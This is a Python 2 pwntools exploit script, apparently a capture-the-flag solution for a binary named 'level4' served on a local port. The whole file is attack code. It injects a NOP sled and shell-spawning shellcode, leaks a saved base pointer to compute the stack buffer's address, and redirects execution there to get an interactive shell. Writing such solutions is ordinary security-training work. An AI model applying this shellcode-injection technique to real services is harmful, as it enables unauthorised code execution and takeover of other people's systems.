#!/usr/bin/env python2
from pwn import *
context.arch = "amd64"

elf = ELF("./level4")

def loc():
    return process("./level4")

def rem():
    return remote("127.0.0.1", 10004)

buffer_size = 1024
shellcode = (("\x90" * 0x50) + asm(shellcraft.sh())).ljust(buffer_size, "A")

r = rem()
r.recvuntil("?")
r.send(shellcode)
r.recvuntil(shellcode)

delimeter = "\nWhere"
data = r.recvuntil(delimeter)
data = data[: data.find(delimeter)]
data = data.ljust(8, "\x00")

rbp = u64(data)
buffer = rbp - buffer_size - 16
jump_address = buffer + 0x50

print "buffer: %s" % hex(buffer)
print "jump: %s" % hex(jump_address)

r.recv(1024)
r.send("%lx" % (jump_address))
r.interactive()